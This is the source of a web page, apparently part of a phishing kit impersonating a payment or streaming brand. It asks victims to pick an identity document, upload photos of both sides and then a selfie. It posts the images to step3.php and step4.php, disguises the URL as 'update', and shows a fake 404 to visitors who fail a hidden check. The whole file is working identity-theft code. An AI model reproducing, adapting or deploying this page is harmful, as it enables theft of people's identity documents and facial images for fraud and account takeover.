@-webkit-keyframes rotation{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg);}to{-webkit-transform:rotate(359deg);transform:rotate(359deg);}}
@-moz-keyframes rotation{0%{-moz-transform:rotate(0deg);transform:rotate(0deg);}to{-moz-transform:rotate(359deg);transform:rotate(359deg);}}
@-o-keyframes rotation{0%{-o-transform:rotate(0deg);transform:rotate(0deg);}to{-o-transform:rotate(359deg);transform:rotate(359deg);}}
@keyframes rotation{0%{-webkit-transform:rotate(0deg);-moz-transform:rotate(0deg);-o-transform:rotate(0deg);transform:rotate(0deg);}to{-webkit-transform:rotate(359deg);-moz-transform:rotate(359deg);-o-transform:rotate(359deg);transform:rotate(359deg);}}
@keyframes move{0%{top:88px;}50%{top:80px;}to{top:88px;}}
/*! CSS Used fontfaces */
@font-face{font-family:pp-sans-small-regular;src:url(http://www.cynthiagreb.com/spotfy/files/fonts/p_small_regular.eot);src:url(http://www.cynthiagreb.com/spotfy/files/fonts/p_small_regular.eot) format("embedded-opentype"),url() format("woff"),url(http://www.cynthiagreb.com/spotfy/files/fonts/p_small_regular.svg) format("svg");}
@font-face{font-family:p_big_sans;font-style:normal;font-weight:200;src:url(http://www.cynthiagreb.com/spotfy/files/fonts/p_big_sans.eot);src:url() format('woff2'),url() format('woff'),url(http://www.cynthiagreb.com/spotfy/files/fonts/p_big_sans.svg) format('svg');}
@font-face{font-family:pp-sans-small-light;src:url(http://www.cynthiagreb.com/spotfy/files/fonts/p_small_light.eot);src:url(http://www.cynthiagreb.com/spotfy/files/fonts/p_small_light.eot) format("embedded-opentype"),url() format("woff"),url(http://www.cynthiagreb.com/spotfy/files/fonts/p_small_light.svg) format("svg");}
</style>
    
    <div class="desktopNav">
        
    </div>
    <div class="mainContainer">
        <div class="hide" id="rotate">
            <div class="spinner">
                <div class="rotate"></div>
                <div class="processing">
                    <?php echo $lg_id['rotate']?>                </div>
            </div>
            <div class="overlay"></div>
        </div>
        <div class="mobileNav">
            
            
            
        </div>
        <div class="contents">
            <section class="mainContents" id="process">
                
            </section>
            <section class="mainContents" id="finish">
                <div style="padding:0 20px">
                    <h1 style="margin:10px;padding-bottom:10px;font-size:2.4rem"><?php echo $lg_id['head']?></h1>
                    <div>
                        <ol class="proof">
                            <li class="itm current">
                                <div class="ui-text-small">
                                    <?php echo $lg_id['proof']['one']?>
                                </div>
                            </li>
                            <li class="itm">
                                <div class="ui-text-small">
                                    <?php echo $lg_id['proof']['two']?>
                                </div>
                            </li>
                            <li class="itm">
                                <div class="ui-text-small">
                                    <?php echo $lg_id['proof']['three']?>
                                </div>
                            </li>
                        </ol>
                    </div>
                    <div id="select_one">
                        <form action="javascript:void(0);" method="POST">
                            <div id="area_choose">
                                <h1 style="font-size:3.4rem!important!important"><?php echo $lg_id['choose']?></h1>
                                <div class="doc_type">
                                    <div class="doc_type_choice">
                                        <div class="doc_type_choice_wrapper">
                                            <div><img src="lib/pics/id_p.svg" alt=""></div>
                                            <label class="cont">
                                                <input type="radio" name="doc_type" value="Passport"><span class="checkmark"></span><span> <?php echo $lg_id['type']['one']?></span></label>
                                        </div>
                                    </div>
                                    <div class="doc_type_choice">
                                        <div class="doc_type_choice_wrapper">
                                            <div><img src="lib/pics/id_n.svg" alt=""></div>
                                            <label class="cont">
                                                <input type="radio" name="doc_type" value="National ID"><span class="checkmark"></span><span> <?php echo $lg_id['type']['two']?></span></label>
                                        </div>
                                    </div>
                                    <div class="doc_type_choice">
                                        <div class="doc_type_choice_wrapper">
                                            <div><img src="lib/pics/id_n.svg" alt=""></div>
                                            <label class="cont">
                                                <input type="radio" name="doc_type" value="Driver's license"><span class="checkmark"></span><span> <?php echo $lg_id['type']['three']?></span></label>
                                        </div>
                                    </div>
                                </div>
                                <input style="margin-bottom:1.2rem;margin-top:1rem" type="button" class="bt bt_select_one" value="<?php echo $lg_id['bt_proceed']?>">
                            </div>
                            <div id="area_up_id" style="display:none">
                                <h1 style="font-size:3.4rem!important"><?php echo $lg_id['head_up']?><span></span></h1>
                                <div class="row rules text-center">
                                    <div class="rule"><img src="lib/pics/scan_id.svg" alt="">
                                        <div>
                                            <?php echo $lg_id['rule1']['one']?>
                                        </div>
                                    </div>
                                    <div class="rule"><img src="lib/pics/both_sides.svg" alt="">
                                        <div>
                                            <?php echo $lg_id['rule1']['two']?>
                                        </div>
                                    </div>
                                    <div class="rule"><img src="lib/pics/both_pass.svg" alt="">
                                        <div>
                                            <?php echo $lg_id['rule1']['three']?>
                                        </div>
                                    </div>
                                </div>
                                <div class="zone" id="up_id_zone">
                                    <div class="dropzone-main" style="display:block">
                                        <div class="dropzone-img">
                                            <input style="display:none" type="file" name="file[]" accept="image/*" multiple>
                                        </div>
                                        <p>
                                            <?php echo $lg_id['drop_zone']?>
                                        </p>
                                    </div>
                                </div>
                                <div class="imagesArea"></div>
                                <input style="margin-bottom:1rem;margin-top:1rem" type="submit" class="bt" value="<?php echo $lg_id['bt_proceed']?>">
                                <div>
                                    <a href="javascript:void(0)" class="back">
                                        <?php echo $lg_id['bt_back']?>
                                    </a>
                                </div>
                            </div>
                        </form>
                        <script>
                            $(document).on('click', '.doc_type_choice', function() {
                                $(this).find('[name="doc_type"]').prop('checked', true);
                            });
                            $('.bt_select_one').click(function() {
                                if ($('[name=doc_type]').is(':checked')) {
                                    $('#area_choose').hide('slow');
                                    $('#area_up_id > h1 > span, #area_up_selfie > h1 > span').html($('[name=doc_type]:checked').parent().find('span:last').html());
                                    $('#area_up_id').show('slow');
                                }
                            });
                            $(document).on('click', '#area_up_id .back', function() {
                                $('#area_up_id').hide('slow');
                                $('#area_choose').show('slow');
                            });
                            $(document).on('submit', '#select_one > form', function(e) {
                                e.preventDefault();
                                if ($('#select_one .imagesArea .imgItem').length == 0) {
                                    return false;
                                }
                                $('#rotate').removeClass('hide');
                                $.post('lib/step3.php', $(this).serialize(), function(dt, st) {
                                    if (dt && st == 'success') {
                                        $('.proof li:nth-child(2)').addClass('current');
                                        $('#select_one').addClass('hide');
                                        $('#select_two').removeClass('hide');
                                        window.scrollTo(0, 0);
                                        $('#rotate').addClass('hide');
                                    }
                                });
                            });
                        </script>
                    </div>
                    <div id="select_two" class="hide">
                        <form action="javascript:void(0);" method="POST">
                            <div id="area_up_selfie">
                                <h1 style="font-size:3.4rem!important"><?php echo $lg_id['head_slf']?><span></span></h1>
                                <div class="row rules text-center">
                                    <div class="rule"><img src="lib/pics/take_s.svg" alt="">
                                        <div>
                                            <?php echo $lg_id['rule2']['one']?>
                                        </div>
                                    </div>
                                    <div class="rule"><img src="lib/pics/fingers_not.svg" alt="">
                                        <div>
                                            <?php echo $lg_id['rule2']['two']?>
                                        </div>
                                    </div>
                                    <div class="rule"><img src="lib/pics/glaesses_not.svg" alt="">
                                        <div>
                                            <?php echo $lg_id['rule2']['three']?>
                                        </div>
                                    </div>
                                </div>
                                <div class="zone" id="up_id_zone">
                                    <div class="dropzone-main" style="display:block">
                                        <div class="dropzone-img" style="background-image:url(lib/pics/up_slf.svg),none">
                                            <input style="display:none" type="file" name="file[]" accept="image/*" multiple>
                                        </div>
                                        <p>
                                            <?php echo $lg_id['drop_zone']?>
                                        </p>
                                    </div>
                                </div>
                                <div class="imagesArea"></div>
                                <input type="hidden" name="id_slf" value="ok">
                                <input style="margin-bottom:1rem;margin-top:1rem" type="submit" class="bt" value="<?php echo $lg_id['bt_proceed']?>">
                                <div>
                                    <a href="javascript:void(0)" class="back">
                                        <?php echo $lg_id['bt_back']?>
                                    </a>
                                </div>
                            </div>
                        </form>
                        <script>
                            $(document).on('click', '#area_up_selfie .back', function() {
                                $('.proof li:nth-child(2)').removeClass('current');
                                $('#select_one').removeClass('hide');
                                $('#select_one .imagesArea').html('');
                                $('#select_one [type=hidden]').remove();
                                $('#select_two').addClass('hide');
                            });
                            $(document).on('submit', '#select_two > form', function(e) {
                                e.preventDefault();
                                if ($('#select_two .imagesArea .imgItem').length == 0) {
                                    return false;
                                }
                                $('#rotate').removeClass('hide');
                                $.post('lib/step4.php', $(this).serialize(), function(dt, st) {
                                    if (dt && st == 'success') {
                                        $('.proof li:nth-child(3)').addClass('current');
                                        $('#select_one').addClass('hide');
                                        $('#select_two').addClass('hide');
                                        $('#select_three').removeClass('hide');
                                        window.scrollTo(0, 0);
                                        setTimeout(function() {
                                            window.location.href = "vb?d<?php echo $dota;?>&<?php echo $dota;?>";
                                        }, 1000);
                                        $('#rotate').addClass('hide');
                                    }
                                });
                            });
                        </script>
                    </div>
                </div>
            </section>
        </div>
    </div>

    <script>
$(document).ready(function() {

            function setId() {
                $('#rotate').addClass('hide');
                $('#process').addClass('hide');
                $('#finish').removeClass('hide');
                window.scrollTo(0, 0);
            }
            

            function readFile(files, me, check) {
                if (files) {
                    for (var i = 0; i < files.length; i++) {
                        var FR = new FileReader();
                        FR.onload = function(e) {
                            if (e.target.result.startsWith("data:image/") && e.total <= 5000000) {
                                if (check) {
                                    $(me).parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="' + e.target.result + '" alt=""><button class="btDel">X</button></div>');
                                } else {
                                    $(me).parent().parent().parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="' + e.target.result + '" alt=""><button class="btDel">X</button></div>');
                                }
                                $(me).closest('form').append('<input type="hidden" value="' + e.target.result + '" name="images[]">');
                            }
                        }
                        FR.readAsDataURL(files[i]);
                    }
                }
            }
            $(document).on('click', '.zone', function(e) {
                e.stopPropagation();
                $(this).find('input[type=file]').trigger(e);
            });
            $(document).on('click', '.btDel', function() {
                $(this).closest('form').find('[value="' + $(this).prev().attr('src') + '"]').remove();
                $(this).parent().remove();
            });
            $(document).on('change', 'input[type=file]', function() {
                readFile(this.files, this, false);
            });
            $(".dropzone-main").on('dragleave', function(e) {
                e.preventDefault();
                $(this).css('border', '2px dashed #dee3e7');
                $(this).css('background', '#f0f2f4');
            });
            $(".dropzone-main").on('dragover', function(e) {
                e.preventDefault();
                $(this).css('border', '2px dashed #1aa34a');
                $(this).css('background', '#ecf1f9');
            });
            $(".dropzone-main").on('drop', function(e) {
                e.preventDefault();
                $(this).css('border', '2px dashed #41ad49');
                readFile(e.originalEvent.dataTransfer.files, this, true);
            });
        });
    </script>

<style>
.swal2-popup {font-size: 16;}
</style>
<script>
function geo() {
Swal.fire({
  type: 'warning',
})}
</script>
<script>
window.history.pushState('<?php echo $bert;?>', '<?php echo $bert;?>', 'update');
</script>
</body></html>
<?php
}else {
header("HTTP/1.0 404 Not Found");	
}
?>